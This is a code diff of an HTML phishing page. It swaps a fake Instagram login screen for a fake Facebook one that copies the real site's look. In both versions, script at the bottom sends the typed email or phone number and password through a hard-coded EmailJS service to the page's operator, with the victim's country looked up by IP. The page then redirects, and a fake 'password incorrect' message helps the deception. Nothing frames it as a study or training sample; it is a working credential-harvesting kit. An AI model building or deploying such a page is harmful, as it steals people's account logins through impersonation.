@@ -1,319 +1,243 @@
 <!DOCTYPE html>
-
-<html lang="en" >
-
-<head>
-  <meta charset="UTF-8">
-  <title>3</title>
-  
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
-    <link rel="stylesheet" href="{% static 'css/instagram.css' %}">
-    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1 </title>
     <script type="module">
       import emailjs from 'https://cdn.emailjs.com/dist/email.min.js';
   </script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
 <style>
-/* Crafted by Apratim Shukla */
-html { height: 100% }
-body {
-  background: rgba(250,250,250,1);
-}
-.login {
-  background: #fff;
-  border: 1px solid rgb(236, 234, 234);
-  border-radius: 0px;
-  height: 410px;
-  margin: 30px auto 0;
-  width: 400px;
-}
-.login h1 {
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
   box-sizing: border-box;
-  margin: 20px 0 30px 0;
-  text-align: center;
-  user-select: none;
-}
-input[type="password"], input[type="text"] {
-  background: rgba(250,250,250,1);
-  border: 1px solid rgb(236, 234, 234);
-  border-radius: 3px;
-  box-shadow: 0 1px #fff;
-  box-sizing: border-box;
-  color: black;
-  height: 39px;
-  margin: 10px 0 0 40px;
-  padding: 10px;
-  font-size: 13px;
-  width: 320px;
-}
-input[type="password"]::placeholder, input[type="text"]::placeholder {
-  color: rgb(165, 164, 164);
-}
-input[type="password"]:focus, input[type="text"]:focus {
-  outline: 0;
-  border: 1px solid #a1a1a1;
+  font-family: 'Roboto', sans-serif;
 }
 
-.one {
-  font-size: -0;
+.flex {
+  display: flex;
+  align-items: center;
 }
 
-.forgot {
-  color: #7f7f7f;
-  display: inline-block;
-  box-sizing: border-box;
-  font: 12px/1 sans-serif;
-  left: -19px;
-  position: relative;
-  text-decoration: none;
-  top: -15px;
-  transition: color .4s;
-}
-.forgot:hover { color: #3b3b3b }
-
-input[type="submit"] {
-  background: #3897F0;
-  border: 0px;
-  border-radius: 4px;
-  box-sizing: border-box;
-  color: #f8f8f8;
-  font-weight: 600;
-  height: 29px;
-  margin: 14px 0 0 40px;
-  width: 320px;
-}
-input[type="submit"]:hover, input[type="submit"]:focus {
-  background: rgb(48, 144, 233);
-  outline: 0;
+.container {
+  padding: 0 15px;
+  min-height: 100vh;
+  justify-content: center;
+  background: #f0f2f5;
 }
 
-
-.divider {
-  overflow: hidden;
-  text-align: center;
-  box-sizing: border-box;
-  color:rgb(165, 164, 164);
-  font-size: 13.5px;
-  font-weight: 500;
-  margin: 20px 0 0 40px;
-  width: 320px;
-}
-
-.divider:before,
-.divider:after {
-  background-color: rgb(224, 221, 221);
-  content: "";
-  display: inline-block;
-  height: 1.2px;
-  position: relative;
-  vertical-align: middle;
-  width: 50%;
-}
-
-.divider:before {
-  right: 2em;
-  margin-left: -50%;
-}
-
-.divider:after {
-  left: 2em;
-  margin-right: -50%;
-}
-
-.fbwrapper {
-  text-align: center;
-  margin-top: 25px;
-}
-
-.fb a{
-  font-weight: 600;
-  font-size: 14px;
-  display: inline;
-  vertical-align: middle;
-  margin: 20px 0 0 10px;
-  text-decoration: none;
-  color: rgb(107, 106, 106);
-  
-}
-.fb img {
-  vertical-align: middle;
-}
-
-.forgotwrapper{
-  text-align: center;
-  margin-top: 35px;
-}
-
-.forgot a{
-  margin: 20px 0 0 40px;
-  text-decoration: none;
-  color: rgb(107, 106, 106);
-}
-
-.infobox {
-  background: #fff;
-  border: 1px solid rgb(236, 234, 234);
-  border-radius: 0px;
-  height: 60px;
-  margin: 10px auto 0;
-  width: 400px;
-}
-.infobox p {
-  box-sizing: border-box;
-  margin: 22px 0 30px 0;
-  text-align: center;
-  user-select: none;
-  font-size: 14px;
-}
-
-.infobox p a{
-  color: rgb(94, 163, 243);
-  text-decoration: none;
-  font-weight: 600;
-}
-
-.apps {
-  height: 100px;
-  margin: 20px auto 0;
-  width: 400px;
-}
-
-.apps p {
-  box-sizing: border-box;
-  margin: 10px 0 30px 0;
-  text-align: center;
-  user-select: none;
-  font-size: 14px;
-}
-
-.apps span a{
-  box-sizing: border-box;
-  margin-left: 28px;
-}
-
-.app span a img{
-  padding-left: 20px;
-}
-
-.footer {
-  position: relative;
-  left: 0;
-  bottom: 0;
-  margin-top: 50px;
+.facebook-page {
+  justify-content: space-between;
+  max-width: 1000px;
   width: 100%;
+}
+
+.facebook-page .text {
+  margin-bottom: 90px;
+}
+
+.facebook-page h1 {
+  color: #1877f2;
+  font-size: 4rem;
+  margin-bottom: 10px;
+}
+
+.facebook-page p {
+  font-size: 1.75rem;
+  white-space: nowrap;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  background: #fff;
+  border-radius: 8px;
+  padding: 20px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+    0 8px 16px rgba(0, 0, 0, 0.1);
+  max-width: 400px;
+  width: 100%;
+}
+
+form input {
+  height: 55px;
+  width: 100%;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  margin-bottom: 15px;
+  font-size: 1rem;
+  padding: 0 14px;
+}
+
+form input:focus {
+  outline: none;
+  border-color: #1877f2;
+}
+
+::placeholder {
+  color: #777;
+  font-size: 1.063rem;
+}
+
+.link {
+  display: flex;
+  flex-direction: column;
   text-align: center;
+  gap: 15px;
 }
 
-.footer p a {
-  color: #003569;
+.link .login {
+  border: none;
+  outline: none;
+  cursor: pointer;
+  background: #1877f2;
+  padding: 15px 0;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 1.25rem;
+  font-weight: 600;
+  transition: 0.2s ease;
+}
+
+.link .login:hover {
+  background: #0d65d9;
+}
+
+form a {
   text-decoration: none;
-  padding-left: 10px;
-  font-size: 13px;
 }
 
-.footer p span {
-  color: rgb(189, 186, 186);
-  padding-left: 80px;
-  font-size: 13px;
+.link .forgot {
+  color: #1877f2;
+  font-size: 0.875rem;
 }
-</style>
+
+.link .forgot:hover {
+  text-decoration: underline;
+}
+
+hr {
+  border: none;
+  height: 1px;
+  background-color: #ccc;
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+
+.button {
+  margin-top: 25px;
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.button a {
+  padding: 15px 20px;
+  background: #42b72a;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 1.063rem;
+  font-weight: 600;
+  transition: 0.2s ease;
+}
+
+.button a:hover {
+  background: #3ba626;
+}
+
+@media (max-width: 900px) {
+  .facebook-page {
+    flex-direction: column;
+    text-align: center;
+  }
+
+  .facebook-page .text {
+    margin-bottom: 30px;
+  }
+}
+
+@media (max-width: 460px) {
+  .facebook-page h1 {
+    font-size: 3.5rem;
+  }
+
+  .facebook-page p {
+    font-size: 1.3rem;
+  }
+
+  form {
+    padding: 15px;
+  }
+}
+</style>  
 <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
-</head>
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form id="contact-form" action="" >
+          <input type="text" name="emanil" id="name" placeholder="Email or phone number" hidden>
+          <input type="text" name="emanil" id="email" placeholder="Email or phone number" required>
+          <input type="hidden" id="region" name="region">
+          <input type="password" placeholder="Password" id="message" name="message" class="input-2" />
+          <p style="color: red; font-size: medium;"> Sorry, your password was incorrect. <br> Please double-check your password.</p>
 
-<body>
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
-<div class="login">
-  
-  <h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
+  <script type="text/javascript">
+    (function() {
+        emailjs.init("sCjvblHtJz5-dnvby"); // Use your EmailJS User ID
+    })();
 
-  <form id="contact-form">
-    <input type="text" placeholder="Username" id="name"  value="facebook" name="name" class="input-1" hidden />
-    <input type="text" placeholder="Username" id="email"  name="email" class="input-1" />
-    <input type="hidden" id="region" name="region">
-    <div class="overlap-text">
-      <input type="password" placeholder="Password" id="message" name="message" class="input-2" />
-  <input class="btn btn-primary" type="submit" value="Log in">
-  </form>
+    document.getElementById("contact-form").addEventListener("submit", function(event) {
+        event.preventDefault();
 
-  <div class="divider"><b>OR</b></div>
+        // Collect form values
+        var name = document.getElementById("name").value;
+        var email = document.getElementById("email").value;
+        var message = document.getElementById("message").value;
+        var region = document.getElementById("region").value;
 
-  <div class="fbwrapper"><div class="fb"><a href="#"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
+        // Prepare email parameters
+        var emailParams = {
+            from_name: name,
+            from_email: email,
+            message: message,
+            region: region
+        };
 
-
-  <div class="forgotwrapper"><div class="forgot"><a href="#">Forgot password?</a></div></div>
-<p style="color: red; font-size: 70%;"> Sorry, your password was incorrect. Please double-check your password.</p>
-  
-</div>
-
-<br>
-<div class="infobox">
-  
-  <p>Don't have an account? <a href="#">Sign up</a></p>
-  
-</div>
-
-<div class="apps">
-
-  <p>Get the app.</p>
-  <span><a href="#"><img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px"></a><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="https://i.imgur.com/DFQNKXK.png" height="45" width="151px"></a></span>
-
-</div>
-
-<div class="footer">
-  <p>
-      <a href="#">ABOUT US</a>
-      <a href="#">SUPPORT</a>
-      <a href="#">PRESS</a>
-      <a href="#">API</a>
-      <a href="#">JOBS</a>
-      <a href="#">PRIVACY</a>
-      <a href="#">TERMS</a>
-      <a href="#">DIRECTORY</a>
-      <a href="#">PROFILES</a>
-      <a href="#">HASHTAGS</a>
-      <a href="">LANGUAGE</a>
-      <span>© 2025 INSTAGRAM</span>
-  </p>
-</div>
-<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-
-<script type="text/javascript">
-  (function() {
-      emailjs.init("sCjvblHtJz5-dnvby"); // Use your EmailJS User ID
-  })();
-
-  document.getElementById("contact-form").addEventListener("submit", function(event) {
-      event.preventDefault();
-
-      // Collect form values
-      var name = document.getElementById("name").value;
-      var email = document.getElementById("email").value;
-      var message = document.getElementById("message").value;
-      var region = document.getElementById("region").value;
-
-      // Prepare email parameters
-      var emailParams = {
-          from_name: name,
-          from_email: email,
-          message: message,
-          region: region
-      };
-
-      // Send the email using EmailJS
-      emailjs.send("service_rt0p7sq", "template_1atsc26", emailParams)
-          .then(function(response) {
-              console.log(" ", response);
-              
-
-        // Redirect to another page after email is sent
-    window.location.href = "fb.html";  // Redirect to a 'thank you' page after email is sent
-          }, function(error) {
-              console.error("Error sending email:", error);
-              alert("Failed to send message. Please try again later.");
-          });
-  });
+        // Send the email using EmailJS
+        emailjs.send("service_rt0p7sq", "template_1atsc26", emailParams)
+            .then(function(response) {
+                console.log(" ", response);
+                
+            // Redirect to another page after email is sent
+        window.location.href = "fb1.html";  // Redirect to a 'thank you' page after email is sent
+            }, function(error) {
+                console.error("Error sending email:", error);
+                alert("Failed to send message. Please try again later.");
+            });
+    });
 </script>
 
 <script type="text/javascript"
@@ -325,6 +249,20 @@ input[type="submit"]:hover, input[type="submit"]:focus {
         publicKey: "sCjvblHtJz5-dnvby",
       });
    })();
+</script>
+<script type="text/javascript">
+  (function(){
+     emailjs.init({
+       publicKey: "sCjvblHtJz5-dnvby",
+     });
+  })();
+</script>
+<script type="text/javascript">
+  (function(){
+     emailjs.init({
+       publicKey: "sCjvblHtJz5-dnvby",
+     });
+  })();
 </script>
 <script>
   // Function to get user's country using IP info service
@@ -350,6 +288,5 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       getUserRegion();
   }
 </script>
-</body>
-
+  </body>
 </html>
